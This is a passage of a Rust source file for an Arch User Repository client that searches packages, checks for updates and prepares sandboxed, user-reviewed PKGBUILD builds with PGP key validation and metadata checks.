//! AUR (Arch User Repository) client with build support

use ahash::AHashSet;
use std::collections::{BTreeMap, BTreeSet};
use std::fs::File;
use std::io::{BufReader, Read, Seek};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use std::time::Duration;

use alpm_types::Version;
use anyhow::{Context, Result};
use dialoguer::Confirm;
use futures::{FutureExt, StreamExt, future::BoxFuture};
use indicatif::{ProgressBar, ProgressStyle};
use owo_colors::OwoColorize;
use serde::{Deserialize, de::DeserializeOwned};
use sha2::{Digest, Sha256};
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use tracing::{instrument, warn};
use which::which;

use super::error::AurError;
use super::parallel_build::BuildJob;
use super::utils::{
    build_user, create_dir_as_user, create_dir_as_user_sync, has_word_boundary_match,
    is_root_owned, is_symlink, original_user, original_user_home, remove_dir_as_user,
    validate_build_dir,
};

use super::super::aur_deps::{check_dependencies_for_outputs, dependency_name};
use super::super::aur_index::AurIndex;
use super::super::aur_metadata::{
    AurJsonPackage, index_path, metadata_index_is_fresh, metadata_path,
};
use super::super::aur_sources::{download_sources, parse_sources};
#[cfg(feature = "pgp")]
use super::super::pkgbuild::PkgBuild;
use crate::config::{AurBuildMethod, Settings};
use crate::core::http::shared_client;
use crate::core::{Package, PackageSource, paths};
use crate::package_managers::{get_potential_aur_packages, pacman_db};
use crate::runtimes::common::{BudgetedReader, BudgetedWriter, MAX_DECOMPRESSED_BYTES};

const AUR_RPC_URL: &str = "https://aur.archlinux.org/rpc";
const AUR_GIT_URL: &str = "https://aur.archlinux.org";
const AUR_RPC_MAX_URI: usize = 4400;
const AUR_SEARCH_MAX_BYTES: usize = 100;
const AUR_GIT_PULL_ARGS: &[&str] = &[
    "-c",
    "core.hooksPath=/dev/null",
    "-c",
    "protocol.file.allow=user",
    "-c",
    "pull.rebase=false",
    "pull",
    "--ff-only",
];

/// Process-wide lock around ALPM database mutations so parallel AUR builds never race.
/// ALPM serializes installs on `/var/lib/pacman/db.lck`, so concurrent installs — e.g. parallel AUR build
/// waves finishing together — either fail spuriously on the lock or race the
/// ALPM database. Builds stay parallel; installs are applied one at a time.
static INSTALL_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
static REVIEW_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
const MAX_PKGBUILD_REVIEW_BYTES: usize = 1024 * 1024;
const SANDBOX_FAKEROOT_ENV: (&str, &str) = ("FAKEROOTDONTTRYCHOWN", "1");
const MAX_PKGINFO_BYTES: u64 = 128 * 1024;
/// Pre-computed length of the AUR RPC info base URL (47 bytes)
const AUR_RPC_INFO_BASE_LEN: usize = 47;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// PGP Key ID Validation
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

/// Result of PGP key ID validation
#[cfg(any(feature = "pgp", test))]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PgpKeyIdStatus {
    /// Full 40-char fingerprint - most secure
    FullFingerprint,
    /// 16-char long key ID - acceptable
    LongKeyId,
    /// 8-char short key ID - INSECURE (vulnerable to collision attacks)
    ShortKeyId,
    /// Empty key ID
    Empty,
    /// Key ID too long (> 64 chars)
    TooLong,
    /// Contains non-hexadecimal characters
    InvalidChars,
    /// Non-standard length (not 8, 16, or 40 chars)
    NonStandardLength,
}

/// Validate a PGP key ID for security.
///
/// # Security
/// - **Short key IDs (8 chars)** are vulnerable to collision attacks where
///   an attacker generates a key with the same short ID as a trusted key.
/// - **Long key IDs (16 chars)** are acceptable but not ideal.
/// - **Full fingerprints (40 chars)** are strongly recommended.
///
/// # Returns
/// - `PgpKeyIdStatus` indicating the validation result:
///   - `"ABCDEF1234567890ABCDEF1234567890ABCDEF12"` → `FullFingerprint`
///   - `"ABCDEF1234567890"` → `LongKeyId`
///   - `"ABCDEF12"` or any 1-15 hex chars → `ShortKeyId` (rejected)
///   - `""` → `Empty`, `>64 chars` → `TooLong`, non-hex → `InvalidChars`,
///     other hex lengths → `NonStandardLength`
#[inline]
#[cfg(any(feature = "pgp", test))]
#[must_use]
pub fn validate_pgp_key_id(key_id: &str) -> PgpKeyIdStatus {
    if key_id.is_empty() {
        return PgpKeyIdStatus::Empty;
    }
    if key_id.len() > 64 {
        return PgpKeyIdStatus::TooLong;
    }
    if !key_id.chars().all(|c| c.is_ascii_hexdigit()) {
        return PgpKeyIdStatus::InvalidChars;
    }

    match key_id.len() {
        40 => PgpKeyIdStatus::FullFingerprint,
        16 => PgpKeyIdStatus::LongKeyId,
        8 => PgpKeyIdStatus::ShortKeyId,
        _ if key_id.len() < 16 => PgpKeyIdStatus::ShortKeyId,
        _ => PgpKeyIdStatus::NonStandardLength,
    }
}

#[cfg(any(feature = "pgp", test))]
fn require_fetchable_pgp_key_id(key_id: &str) -> Result<()> {
    match validate_pgp_key_id(key_id) {
        PgpKeyIdStatus::FullFingerprint | PgpKeyIdStatus::LongKeyId => Ok(()),
        PgpKeyIdStatus::NonStandardLength => {
            tracing::debug!(
                "PGP key ID '{key_id}' is {} chars (40-char fingerprint recommended)",
                key_id.len()
            );
            Ok(())
        }
        PgpKeyIdStatus::ShortKeyId => anyhow::bail!(
            "Rejecting short PGP key ID '{key_id}' (vulnerable to collision attacks). \
             Use full fingerprint (40 chars) or long key ID (16 chars)."
        ),
        PgpKeyIdStatus::Empty | PgpKeyIdStatus::TooLong => {
            anyhow::bail!("Invalid PGP key ID (bad length): {key_id}")
        }
        PgpKeyIdStatus::InvalidChars => {
            anyhow::bail!("Invalid PGP key ID (non-hex chars): {key_id}")
        }
    }
}

#[cfg(feature = "pgp")]
fn create_scoped_pgp_home(
    valid_keys: &[String],
    source_home: &Path,
    cache_dir: &Path,
) -> Result<tempfile::TempDir> {
    use crate::core::security::keyserver;

    std::fs::create_dir_all(cache_dir).with_context(|| {
        format!(
            "Failed to create AUR cache directory: {}",
            cache_dir.display()
        )
    })?;
    let build_keyring = tempfile::Builder::new()
        .prefix("aur-pgp-")
        .tempdir_in(cache_dir)
        .context("Failed to create package-scoped AUR PGP keyring")?;
    let exported = std::process::Command::new("gpg")
        .arg("--no-options")
        .arg("--batch")
        .arg("--homedir")
        .arg(source_home)
        .arg("--export")
        .args(valid_keys)
        .output()
        .context("Failed to export AUR PGP keys")?;
    anyhow::ensure!(
        exported.status.success() && !exported.stdout.is_empty(),
        "Failed to export AUR PGP keys: {}",
        String::from_utf8_lossy(&exported.stderr).trim()
    );
    let key_bundle = build_keyring.path().join("trusted-keys.pgp");
    std::fs::write(&key_bundle, &exported.stdout).context("Failed to stage AUR PGP keys")?;
    let imported = std::process::Command::new("gpg")
        .arg("--no-options")
        .arg("--batch")
        .arg("--homedir")
        .arg(build_keyring.path())
        .arg("--import")
        .arg(&key_bundle)
        .output()
        .context("Failed to initialize package-scoped AUR PGP keyring")?;
    anyhow::ensure!(
        imported.status.success(),
        "Failed to initialize package-scoped AUR PGP keyring: {}",
        String::from_utf8_lossy(&imported.stderr).trim()
    );
    for key_id in valid_keys {
        anyhow::ensure!(
            keyserver::is_key_in_gnupg(key_id, build_keyring.path())?,
            "Package-scoped AUR PGP keyring is missing {key_id}"
        );
    }
    Ok(build_keyring)
}

fn require_unprivileged_builder(package: &str, is_root: bool) -> Result<()> {
    if is_root {
        anyhow::bail!(
            "AUR packages must not be built as root.\n  \
             → Run omg as your regular user; it will request sudo only for dependency and package installation.\n  \
             → Retry without sudo: omg install {package}"
        );
    }
    Ok(())
}

/// AUR API client with build support
#[derive(Clone)]
pub struct AurClient {
    build_dir: PathBuf,
    settings: Settings,
    package_base_locks: Arc<dashmap::DashMap<String, Arc<tokio::sync::Mutex<()>>>>,
}

impl std::fmt::Debug for AurClient {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // Deliberately excludes settings; they may carry user-specific paths.
        f.debug_struct("AurClient")
            .field("build_dir", &self.build_dir)
            // `settings` deliberately omitted: may carry user-specific paths.
            .finish_non_exhaustive()
    }
}

struct MakepkgEnv {
    makeflags: String,
    pkgdest: PathBuf,
    srcdest: PathBuf,
    builddir: PathBuf,
    compiler_cache_dirs: Vec<PathBuf>,
    extra_env: Vec<(String, String)>,
    pgp_home: Option<tempfile::TempDir>,
}

#[derive(Debug)]
pub(crate) struct AuthorizedBuild {
    package: String,
    requested_outputs: Vec<String>,
    reviewed_digest: Option<String>,
}

#[derive(Debug)]
struct AurDependencyPlan {
    aur_dependencies: Vec<String>,
    official_dependencies: Vec<String>,
    package_outputs: Vec<String>,
}

/// Identity and .INSTALL payload extracted from one package archive
/// (SEC-R2-01 cached-artifact provenance verification).
struct CachedArchiveIdentity {
    name: String,
    version: String,
    base: String,
    install_script: Option<String>,
}

#[derive(Clone, Copy)]
enum BuildOutputStream {
    Stdout,
    Stderr,
}

/// Drain one child stream completely so a quiet build can never block on a
/// full pipe. Log failures are remembered while draining continues; otherwise
/// a compiler could deadlock before omg has a chance to report the I/O error.
fn configure_auxiliary_output(command: &mut Command) {
    if crate::cli::modern_ui::output_mode() == crate::cli::modern_ui::OutputMode::Verbose {
        command.stdout(Stdio::inherit()).stderr(Stdio::inherit());
    } else {
        command.stdout(Stdio::null()).stderr(Stdio::null());
    }
}

/// Give PKGBUILD-driven processes a minimal deterministic environment.
/// Credentials, agent sockets, language injection paths, and caller-specific
/// tokens are absent because the command starts from `env_clear`.
fn configure_build_environment(command: &mut Command, home: &Path, user: &str) {
    command
        .env_clear()
        .env("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin")
        .env("HOME", home)
        .env("XDG_CACHE_HOME", home.join(".cache"))
        .env("USER", user)
        .env("LOGNAME", user)
        .env("LANG", "C.UTF-8")
        .env("LC_ALL", "C.UTF-8");
}

fn sandbox_command(home: &Path, user: &str) -> Command {
    let mut command = Command::new("bwrap");
    configure_build_environment(&mut command, home, user);
    command.args([
        "--clearenv",
        "--share-net",
        "--unshare-pid",
        "--new-session",
        "--die-with-parent",
    ]);
    command
}

/// Make `/etc/resolv.conf` usable when it points outside the read-only `/etc`
/// mount, as systemd-resolved and NetworkManager commonly do under `/run`.
fn configure_sandbox_resolver(command: &mut Command) -> Result<()> {
    configure_sandbox_resolver_at(command, "/etc/resolv.conf".as_ref())
}

fn configure_sandbox_resolver_at(command: &mut Command, resolver_config: &Path) -> Result<()> {
    let resolver = match resolver_config.canonicalize() {
        Ok(resolved) => resolved,
        // A host without a resolver (container, offline chroot, dangling
        // symlink to an unmounted /run) has nothing to bind; skipping keeps
        // the sandbox identical to the host instead of failing every build.
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(error) => {
            return Err(error).with_context(|| {
                format!(
                    "Failed to resolve {} for the AUR sandbox",
                    resolver_config.display()
                )
            });
        }
    };
    if resolver.starts_with("/etc") {
        return Ok(());
    }
    anyhow::ensure!(
        resolver.is_file(),
        "AUR sandbox resolver target is not a file: {}",
        resolver.display()
    );

    let mut parents: Vec<_> = resolver
        .parent()
        .into_iter()
        .flat_map(Path::ancestors)
        .filter(|path| *path != Path::new("/"))
        .collect();
    parents.reverse();
    for parent in parents {
        command.arg("--dir").arg(parent);
    }
    command.arg("--ro-bind").arg(&resolver).arg(&resolver);
    Ok(())
}

fn build_identity() -> (String, PathBuf) {
    let user =
        build_user().unwrap_or_else(|| whoami::username().unwrap_or_else(|_| "nobody".into()));
    let home = std::env::var_os("SUDO_HOME")
        .map(PathBuf::from)
        .or_else(home::home_dir)
        .unwrap_or_else(|| PathBuf::from(format!("/home/{user}")));
    (user, home)
}

fn pkgbuild_review_text(bytes: &[u8]) -> Result<String> {
    anyhow::ensure!(
        bytes.len() <= MAX_PKGBUILD_REVIEW_BYTES,
        "PKGBUILD exceeds the {MAX_PKGBUILD_REVIEW_BYTES} byte review limit"
    );
    let text = String::from_utf8_lossy(bytes);
    Ok(text
        .chars()
        .filter(|character| {
            matches!(character, '\n' | '\t')
                || (!character.is_control()
                    && !matches!(
                        character,
                        '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}'
                    ))
        })
        .collect())
}

/// SHA-256 hex digest of raw PKGBUILD bytes.
fn pkgbuild_digest(bytes: &[u8]) -> String {
    hex::encode(Sha256::digest(bytes))
}

/// Re-read `pkgbuild_path` and confirm its bytes still hash to the digest the
/// user reviewed. A mismatch means the PKGBUILD changed between review and
/// build and the reviewed script is not the one about to run.
fn verify_reviewed_pkgbuild(pkgbuild_path: &Path, reviewed_digest: &str) -> Result<()> {
    let bytes = std::fs::read(pkgbuild_path)
        .with_context(|| format!("Failed to re-read PKGBUILD: {}", pkgbuild_path.display()))?;
    anyhow::ensure!(
        pkgbuild_digest(&bytes) == reviewed_digest,
        "PKGBUILD changed after review: {} (refusing to build a script the user did not review)",
        pkgbuild_path.display()
    );
    Ok(())
}

fn pkgbuild_review_panel(package: &str, digest: &str, review: &str) -> String {
    let package = crate::cli::style::sanitize_terminal_text(package);
    let divider = "─".repeat(72);

    if crate::cli::style::colors_enabled() {
        format!(
            "\n  {} {}\n\n    {} {}\n\n  {}\n{}\n  {}",
            " AUR ".black().on_magenta().bold(),
            format!("Review {package}").bold(),
            "SHA-256".dimmed(),
            digest.dimmed(),
            divider.dimmed(),
            review.trim_end(),
            divider.dimmed()
        )
    } else {
        format!(
            "\n  AUR  Review {package}\n\n    SHA-256 {digest}\n\n  {divider}\n{}\n  {divider}",
            review.trim_end()
        )
    }
}

fn pkgbuild_review_prompt(package: &str) -> String {
    let package = crate::cli::style::sanitize_terminal_text(package);
    format!("Build {package} from this PKGBUILD?")
}

async fn drain_build_output<R>(
    mut reader: R,
    log: Arc<tokio::sync::Mutex<tokio::fs::File>>,
    stream: BuildOutputStream,
    verbose: bool,
) -> std::io::Result<()>
where
    R: AsyncRead + Unpin,
{
    let mut buffer = [0_u8; 16 * 1024];
    let mut log_error = None;
    let mut log_writable = true;
    let mut terminal_writable = verbose;
    let mut stdout = tokio::io::stdout();
    let mut stderr = tokio::io::stderr();

    loop {
        let read = reader.read(&mut buffer).await?;
        if read == 0 {
            break;
        }
        let chunk = &buffer[..read];

        if log_writable {
            let result = log.lock().await.write_all(chunk).await;
            if let Err(error) = result {
                log_writable = false;
                log_error = Some(error);
            }
        }

        if terminal_writable {
            let result = match stream {
                BuildOutputStream::Stdout => stdout.write_all(chunk).await,
                BuildOutputStream::Stderr => stderr.write_all(chunk).await,
            };
            if result.is_err() {
                // A closed output consumer must not stop us draining the child.
                terminal_writable = false;
            }
        }
    }

    if let Some(error) = log_error {
        Err(error)
    } else {
        Ok(())
    }
}

#[derive(Debug, Deserialize)]
struct AurResponse {
    results: Vec<AurJsonPackage>,
}

fn ensure_aur_rpc_success(status: reqwest::StatusCode) -> Result<()> {
    anyhow::ensure!(
        status.is_success(),
        "AUR RPC request to {AUR_RPC_URL} returned HTTP {status}"
    );
    Ok(())
}

fn decode_aur_rpc_body<T: DeserializeOwned>(body: &[u8]) -> Result<T> {
    let value: serde_json::Value =
        serde_json::from_slice(body).context("Failed to parse AUR RPC response")?;
    if value.get("type").and_then(serde_json::Value::as_str) == Some("error") {
        let detail = value
            .get("error")
            .and_then(serde_json::Value::as_str)
            .filter(|message| !message.trim().is_empty())
            .unwrap_or("unknown AUR RPC error");
        anyhow::bail!("AUR RPC returned an error: {detail}");
    }

    serde_json::from_value(value).context("Failed to parse AUR RPC response")
}

async fn decode_aur_rpc_response<T: DeserializeOwned>(response: reqwest::Response) -> Result<T> {
    ensure_aur_rpc_success(response.status())?;
    let body = response.bytes().await.map_err(redact_aur_transport_error)?;
    decode_aur_rpc_body(&body)
}

fn redact_aur_transport_error(_: reqwest::Error) -> anyhow::Error {
    anyhow::anyhow!("AUR RPC transport failed. Check your internet connection.")
}

impl AurClient {
    pub fn new() -> Result<Self> {
        let settings = Settings::load().context("Failed to load OMG settings for AUR")?;
        let build_dir = paths::cache_dir().join("aur");

        Ok(Self {
            build_dir,
            settings,
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        })
    }

    fn package_base_lock(&self, package_base: &str) -> Arc<tokio::sync::Mutex<()>> {
        Arc::clone(
            self.package_base_locks
                .entry(package_base.to_string())
                .or_insert_with(|| Arc::new(tokio::sync::Mutex::new(())))
                .value(),
        )
    }

    fn package_base_marker(package_base: &str) -> String {
        format!("pkgbase:{package_base}")
    }

    async fn acquire_package_base_file_lock(&self, package_base: &str) -> Result<File> {
        let lock_dir = self.build_dir.join("_locks");
        create_dir_as_user(&lock_dir).await?;
        let lock_path = lock_dir.join(format!("{package_base}.lock"));
        tokio::task::spawn_blocking(move || -> Result<File> {
            let file = std::fs::OpenOptions::new()
                .create(true)
                .read(true)
                .write(true)
                .truncate(false)
                .open(&lock_path)
                .with_context(|| {
                    format!("Failed to open AUR build lock {}", lock_path.display())
                })?;
            file.lock().with_context(|| {
                format!("Failed to acquire AUR build lock {}", lock_path.display())
            })?;
            Ok(file)
        })
        .await
        .context("AUR build lock worker failed")?
    }

    #[must_use]
    pub fn build_concurrency(&self) -> usize {
        self.settings.aur.build_concurrency.max(1)
    }

    async fn fresh_metadata_index_path(&self) -> Option<PathBuf> {
        if !self.settings.aur.use_metadata_archive {
            return None;
        }

        let archive_path = metadata_path();
        let index_path = index_path();
        let ttl = Duration::from_secs(self.settings.aur.metadata_cache_ttl_secs);
        match tokio::task::spawn_blocking({
            let index_path = index_path.clone();
            move || metadata_index_is_fresh(&archive_path, &index_path, ttl)
        })
        .await
        {
            Ok(true) => Some(index_path),
            Ok(false) => None,
            Err(error) => {
                warn!("AUR metadata freshness check failed: {error}");
                None
            }
        }
    }

    /// Search AUR packages
    pub async fn search(&self, query: &str) -> Result<Vec<Package>> {
        validate_search_query(query)?;

        // Try the binary index only while its source archive is within the
        // configured TTL. Stale indexes fall through to the live RPC.
        if let Some(index_path) = self.fresh_metadata_index_path().await {
            let query_owned = query.to_string();
            let result = tokio::task::spawn_blocking(move || -> Result<Vec<Package>> {
                let index = AurIndex::open(&index_path)?;
                let entries = index.search(&query_owned, 50)?;
                Ok(entries
                    .into_iter()
                    .filter_map(|entry| {
                        let name = entry.name.as_str();
                        if let Err(error) = validate_index_entry_name(name, None) {
                            warn!("Rejecting AUR index entry '{name}': {error}");
                            return None;
                        }
                        // AUR metadata is an untrusted boundary: a version
                        // that fails the strict parser must not compare as a
                        // fabricated 0 (ARCH-R14); reject the entry visibly.
                        let Some(version) =
                            crate::package_managers::parse_version(entry.version.as_str())
                        else {
                            warn!(
                                "Rejecting AUR index entry '{name}': unparseable version '{}'",
                                entry.version.as_str()
                            );
                            return None;
                        };
                        Some(Package {
                            name: name.to_string(),
                            version,
                            description: entry
                                .description
                                .as_ref()
                                .map(|description| description.as_str().to_string())
                                .unwrap_or_default(),
                            source: PackageSource::Aur,
                            installed: false,
                        })
                    })
                    .collect())
            })
            .await?;

            if let Ok(packages) = result
                && !packages.is_empty()
            {
                return Ok(packages);
            }
        }

        let url = format!(
            "{AUR_RPC_URL}?v=5&type=search&arg={}",
            urlencoding::encode(query)
        );

        let response = shared_client().get(&url).send().await.map_err(|error| {
            let error = redact_aur_transport_error(error);
            tracing::warn!("AUR search network error: {error}");
            error
        })?;
        let response: AurResponse = decode_aur_rpc_response(response).await?;

        let mut packages: Vec<Package> = response
            .results
            .into_iter()
            .filter(|p| {
                crate::core::security::validate_package_name(&p.name)
                    .inspect_err(|e| {
                        tracing::warn!(
                            "Rejecting invalid package name from AUR search: {} ({})",
                            p.name,
                            e
                        );
                    })
                    .is_ok()
            })
            .filter_map(|p| {
                // AUR RPC metadata is an untrusted boundary: a version that
                // fails the strict parser must not compare as a fabricated 0
                // (ARCH-R14); reject the entry visibly.
                let Some(version) = crate::package_managers::parse_version(&p.version) else {
                    tracing::warn!(
                        "Rejecting AUR search result '{}' with unparseable version '{}'",
                        p.name,
                        p.version
                    );
                    return None;
                };
                Some(Package {
                    name: p.name,
                    version,
                    description: p.description.unwrap_or_default(),
                    source: PackageSource::Aur,
                    installed: false,
                })
            })
            .collect();

        // Rank exact, prefix, and word-boundary matches before shorter names.
        // Pre-compute lowercased names to avoid O(n log n) allocations during sort
        let query_lower = query.to_ascii_lowercase();

        // Precompute sort keys: (exact, prefix, word_boundary, name_len, name_lower, original_idx)
        let mut keyed: Vec<_> = packages
            .into_iter()
            .map(|pkg| {
                let name_lower = pkg.name.to_ascii_lowercase();
                let exact = name_lower == query_lower;
                let prefix = name_lower.starts_with(&query_lower);
                let word = has_word_boundary_match(&name_lower, &query_lower);
                (exact, prefix, word, pkg.name.len(), name_lower, pkg)
            })
            .collect();

        // Sort using precomputed keys - no allocations during comparison
        keyed.sort_by(|a, b| {
            // Exact matches first
            if a.0 != b.0 {
                return b.0.cmp(&a.0);
            }
            // Prefix matches second
            if a.1 != b.1 {
                return b.1.cmp(&a.1);
            }
            // Word boundary matches third
            if a.2 != b.2 {
                return b.2.cmp(&a.2);
            }
            // Shorter names (more specific) fourth
            match a.3.cmp(&b.3) {
                std::cmp::Ordering::Equal => a.4.cmp(&b.4), // Alphabetical by lowercase
                other => other,
            }
        });

        // Extract sorted packages
        packages = keyed.into_iter().map(|(_, _, _, _, _, pkg)| pkg).collect();

        Ok(packages)
    }

    /// Get info for a specific AUR package
    pub async fn info(&self, package: &str) -> Result<Option<Package>> {
        // SECURITY: Validate package name
        crate::core::security::validate_package_name(package)?;

        // Try the binary index only while its source archive is fresh.
        if let Some(index_path) = self.fresh_metadata_index_path().await {
            let package_owned = package.to_string();
            let result = tokio::task::spawn_blocking(move || -> Result<Option<Package>> {
                let index = AurIndex::open(&index_path)?;
                if let Some(entry) = index.get(&package_owned)? {
                    validate_index_entry_name(entry.name.as_str(), Some(&package_owned))?;
                    // A corrupt index version must not compare as a fabricated
                    // 0 (ARCH-R14); surface a typed error so the caller falls
                    // back to the live RPC for this package.
                    let version = crate::package_managers::parse_version(entry.version.as_str())
                        .ok_or_else(|| {
                            anyhow::anyhow!(
                                "AUR index entry '{}' has an unparseable version '{}'",
                                entry.name.as_str(),
                                entry.version.as_str()
                            )
                        })?;
                    return Ok(Some(Package {
                        name: entry.name.as_str().to_string(),
                        version,
                        description: entry
                            .description
                            .as_ref()
                            .map(|s| s.as_str().to_string())
                            .unwrap_or_default(),
                        source: PackageSource::Aur,
                        installed: false,
                    }));
                }
                Ok(None)
            })
            .await?;

            match result {
                Ok(Some(package)) => return Ok(Some(package)),
                Ok(None) => {}
                Err(error) => warn!("AUR index lookup failed; falling back to RPC: {error}"),
            }
        }

        let url = format!(
            "{AUR_RPC_URL}?v=5&type=info&arg={}",
            urlencoding::encode(package)
        );

        let response = shared_client().get(&url).send().await.map_err(|error| {
            let error = redact_aur_transport_error(error);
            tracing::warn!("AUR info network error: {error}");
            error
        })?;
        let response: AurResponse = decode_aur_rpc_response(response).await?;

        let Some(p) = response.results.into_iter().next() else {
            return Ok(None);
        };
        crate::core::security::validate_package_name(&p.name)
            .context("AUR returned an invalid package name")?;
        if p.name != package {
            anyhow::bail!(
                "AUR returned unexpected package '{0}' for '{package}'",
                p.name
            );
        }

        // AUR RPC metadata is an untrusted boundary: a version that fails the
        // strict parser must fail the lookup with a typed error instead of
        // comparing as a fabricated 0 (ARCH-R14).
        let version = crate::package_managers::parse_version(&p.version).with_context(|| {
            format!(
                "AUR returned an unparseable version '{}' for '{}'",
                p.version, p.name
            )
        })?;

        Ok(Some(Package {
            name: p.name,
            version,
            description: p.description.unwrap_or_default(),
            source: PackageSource::Aur,
            installed: false,
        }))
    }

    /// Get list of upgradable AUR packages
    /// Queries AUR directly for all non-official packages (like yay/paru)
    #[instrument(skip(self))]
    pub async fn get_update_list(&self) -> Result<Vec<(String, Version, Version)>> {
        // 1. Get all packages not in official repos
        let foreign_packages = tokio::task::spawn_blocking(get_potential_aur_packages)
            .await
            .context("AUR foreign-package scan task failed")??;

        if foreign_packages.is_empty() {
            return Ok(Vec::new());
        }

        // 2. Try the binary index only while its source archive is fresh.
        // Update discovery never synchronously refreshes global metadata: if
        // the index is stale, absent, unreadable, or errors, fall straight
        // through to the AUR RPC instead.
        if let Some(index_path) = self.fresh_metadata_index_path().await {
            let local_names = foreign_packages.clone();
            let result = tokio::task::spawn_blocking(
                move || -> Result<Option<(Vec<(String, Version, Version)>, Vec<String>)>> {
                    let mut local_pkgs = Vec::with_capacity(local_names.len());
                    for name in local_names {
                        if let Some(package) = pacman_db::get_local_package(&name)? {
                            local_pkgs.push((name, package.version));
                        }
                    }
                    let index = match AurIndex::open(&index_path) {
                        Ok(idx) => idx,
                        Err(e) => {
                            warn!("Failed to open AUR index: {}. Will fallback to RPC.", e);
                            return Ok(None);
                        }
                    };

                    Ok(Some(index.updates_for(&local_pkgs)?))
                },
            )
            .await?;

            if let Ok(Some((mut updates, missing))) = result {
                if missing.is_empty() {
                    tracing::debug!("AUR update check completed via binary index");
                    return Ok(updates);
                }
                // The index is partially stale: query the RPC for exactly the
                // names it lacks instead of silently treating them as current.
                tracing::debug!(
                    "Binary index missing {} package(s); querying RPC for those",
                    missing.len()
                );
                let rpc_updates = self.query_aur_updates(&missing).await?;
                updates.extend(rpc_updates);
                return Ok(updates);
            }
        }

        // 3. Fallback: Query AUR RPC directly for all foreign packages.
        self.query_aur_updates(&foreign_packages).await
    }

    /// Query AUR RPC for package updates (parallel chunked requests)
    /// Query the AUR RPC `type=info` endpoint for one chunk of package names,
    /// retrying transient failures with exponential backoff.
    async fn rpc_info_chunk(chunk: &[String]) -> Result<AurResponse> {
        Self::rpc_info_chunk_at(AUR_RPC_URL, chunk).await
    }

    async fn rpc_info_chunk_at(endpoint: &str, chunk: &[String]) -> Result<AurResponse> {
        let mut url = format!("{endpoint}?v=5&type=info");
        for name in chunk {
            url.push_str("&arg[]=");
            url.push_str(&urlencoding::encode(name));
        }

        let mut last_error = None;
        for retry in 0..3u32 {
            if retry > 0 {
                tokio::time::sleep(crate::core::http::retry_backoff(
                    Duration::from_millis(100),
                    retry - 1,
                ))
                .await;
            }

            match shared_client().get(&url).send().await {
                Ok(response) => {
                    if crate::core::http::is_retryable_status(response.status()) {
                        last_error = ensure_aur_rpc_success(response.status()).err();
                        continue;
                    }
                    ensure_aur_rpc_success(response.status())?;
                    match response.bytes().await {
                        Ok(body) => return decode_aur_rpc_body(&body),
                        Err(error) => last_error = Some(redact_aur_transport_error(error)),
                    }
                }
                Err(error) if crate::core::http::is_retryable_error(&error) => {
                    last_error = Some(redact_aur_transport_error(error));
                }
                Err(error) => return Err(redact_aur_transport_error(error)),
            }
        }
        Err(last_error.unwrap_or_else(|| anyhow::anyhow!("AUR request failed after retries")))
    }

    async fn query_aur_updates(
        &self,
        packages: &[String],
    ) -> Result<Vec<(String, Version, Version)>> {
        let mut updates = Vec::with_capacity(packages.len() / 10 + 1);
        let chunked_names = Self::chunk_aur_names(packages);
        // Network I/O bound - use higher concurrency
        let concurrency = self.settings.aur.build_concurrency.clamp(4, 16);

        let mut stream = futures::stream::iter(chunked_names)
            .map(|chunk| async move { Self::rpc_info_chunk(&chunk).await })
            .buffer_unordered(concurrency);

        while let Some(res) = stream.next().await {
            let response = res.map_err(|e| {
                tracing::warn!("AUR update check failed: {}", e);
                anyhow::anyhow!("Failed to check AUR updates. Check your internet connection.")
            })?;
            let chunk_updates = tokio::task::spawn_blocking(move || -> Result<Vec<_>> {
                let mut updates = Vec::new();
                for package in response.results {
                    if let Err(error) = crate::core::security::validate_package_name(&package.name)
                    {
                        tracing::warn!(
                            "Rejecting invalid package name from AUR update check: {} ({})",
                            package.name,
                            error
                        );
                        continue;
                    }

                    if let Some(local_package) = pacman_db::get_local_package(&package.name)? {
                        let Some(remote_version) =
                            crate::package_managers::parse_version(&package.version)
                        else {
                            tracing::warn!(
                                "Skipping AUR package '{}' with unparseable version '{}'",
                                package.name,
                                package.version
                            );
                            continue;
                        };
                        if crate::package_managers::types::compare_versions(
                            &remote_version,
                            &local_package.version,
                        ) == std::cmp::Ordering::Greater
                        {
                            updates.push((package.name, local_package.version, remote_version));
                        }
                    }
                }
                Ok(updates)
            })
            .await
            .context("AUR local-version comparison task failed")??;
            updates.extend(chunk_updates);
        }

        Ok(updates)
    }

    #[must_use]
    fn chunk_aur_names(names: &[String]) -> Vec<Vec<String>> {
        let mut chunks: Vec<Vec<String>> = Vec::with_capacity((names.len() / 100) + 1);
        let mut current: Vec<String> = Vec::with_capacity(100);
        let mut current_len = AUR_RPC_INFO_BASE_LEN;

        for name in names {
            // `rpc_info_chunk` percent-encodes every name before appending it
            // to the query string. Account for the wire length, not UTF-8
            // source bytes, or names containing valid `+`/`@` characters can
            // push a supposedly bounded request over the URI limit.
            let arg_len = "&arg[]=".len() + urlencoding::encode(name).len();
            if !current.is_empty() && current_len + arg_len > AUR_RPC_MAX_URI {
                chunks.push(current);
                current = Vec::with_capacity(100);
                current_len = AUR_RPC_INFO_BASE_LEN;
            }
            current_len += arg_len;
            current.push(name.clone());
        }

        if !current.is_empty() {
            chunks.push(current);
        }

        chunks
    }

    pub(crate) async fn build_jobs_for_updates(
        &self,
        packages: &[String],
    ) -> Result<Vec<BuildJob>> {
        if packages.is_empty() {
            return Ok(Vec::new());
        }
        for package in packages {
            crate::core::security::validate_package_name(package)?;
        }

        let mut package_info = Vec::with_capacity(packages.len());
        for chunk in Self::chunk_aur_names(packages) {
            package_info.extend(Self::rpc_info_chunk(&chunk).await?.results);
        }
        Self::build_jobs_from_package_info(packages, &package_info)
    }

    fn build_jobs_from_package_info(
        packages: &[String],
        package_info: &[AurJsonPackage],
